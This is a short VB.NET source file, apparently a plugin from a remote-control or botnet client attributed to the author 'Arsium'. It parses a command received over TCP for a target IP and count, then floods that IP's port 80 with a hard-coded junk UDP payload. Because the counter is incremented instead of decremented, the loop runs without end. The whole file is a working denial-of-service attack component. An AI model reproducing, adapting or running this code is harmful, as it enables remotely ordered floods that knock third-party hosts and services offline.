Imports System.Net
Imports System.Net.Sockets
Imports System.Text
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Public Class MainCL

    Public Shared Sub ST(ByVal k As TcpClient, ByVal l As String)

        'Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"

        Dim h As String() = Split(l, "|SP2|")


        Task.Run(Sub() WorkerThreadFORUDP(h(1), h(2)))

    End Sub
    Public Shared Sub WorkerThreadFORUDP(ByVal IP As String, ByVal Count As Integer)

        Dim o As Integer = 0
        Dim bytCommand As Byte() = New Byte() {}


        bytCommand = Encoding.ASCII.GetBytes("cds46546ds5c1qqsd56q4sd89ds556AEFZAE5ZF6FAE5Z151F651F19AZF98AZF89EZFA89R89GEZR89EGZF89EGZF898F9*/8/*/Z*ED8DQ5FS89DQSF562DQSF56QSDQDFS895DQSFDQSF8DQ5SFDQSFQ98DSF8Q9SF18915f4qfdsd4dsfq4sfd998sd89qdsDSssdqQDSDsqdQSDf89qf89qqqd9qd9qd989q899qdsfqds65dsf1dsq5f1dsq53f12sdq53f")


        While 0 < Count



            Dim udpClient As New UdpClient
            Dim GLOIP As IPAddress

            GLOIP = IPAddress.Parse(IP)
            udpClient.Connect(GLOIP, 80)
            udpClient.Send(bytCommand, bytCommand.Length)

            Count += 1

        End While





    End Sub
End Class
